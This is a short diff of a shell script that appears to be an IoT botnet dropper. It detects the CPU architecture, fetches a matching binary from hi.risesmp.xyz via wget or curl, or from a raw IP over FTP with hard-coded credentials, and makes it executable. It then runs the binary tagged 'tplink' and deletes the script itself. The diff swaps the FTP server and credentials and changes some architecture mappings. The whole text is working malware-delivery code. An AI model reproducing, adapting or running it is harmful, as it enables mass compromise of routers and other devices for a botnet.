@@ -8,12 +8,11 @@ case "$ARCH" in
     *mips64*) BIN="nt.mips64" ;;
     *mipsel*|*mips*l) BIN="nt.mpsl" ;;
     *mips*) BIN="nt.mips" ;;
-    *x86_64*) BIN="nt.x86_64" ;;
+    *x86*) BIN="nt.x86" ;;
     *i386*|*i686*) BIN="nt.x86" ;;
     *ppc*|*powerpc*) BIN="nt.ppc" ;;
     *sh4*) BIN="nt.sh4" ;;
     *m68k*) BIN="nt.m68k" ;;
-    *sparc*) BIN="nt.sparc" ;;
     *) BIN="nt.arm" ;;
 esac
 
@@ -23,10 +22,11 @@ done
 
 (wget http://hi.risesmp.xyz/$BIN -O nt || \
  curl -L http://hi.risesmp.xyz/$BIN -o nt || \
- ftpget -v -u goot -p 1lo2ey134251 5.223.61.123 nt $BIN)
+ ftpget -v -u poo -p v9dW41qdsg 103.106.228.189 nt $BIN)
 
 chmod +x nt
 ./nt tplink &
 sh nt tplink &
 
 rm -f hi.sh
+
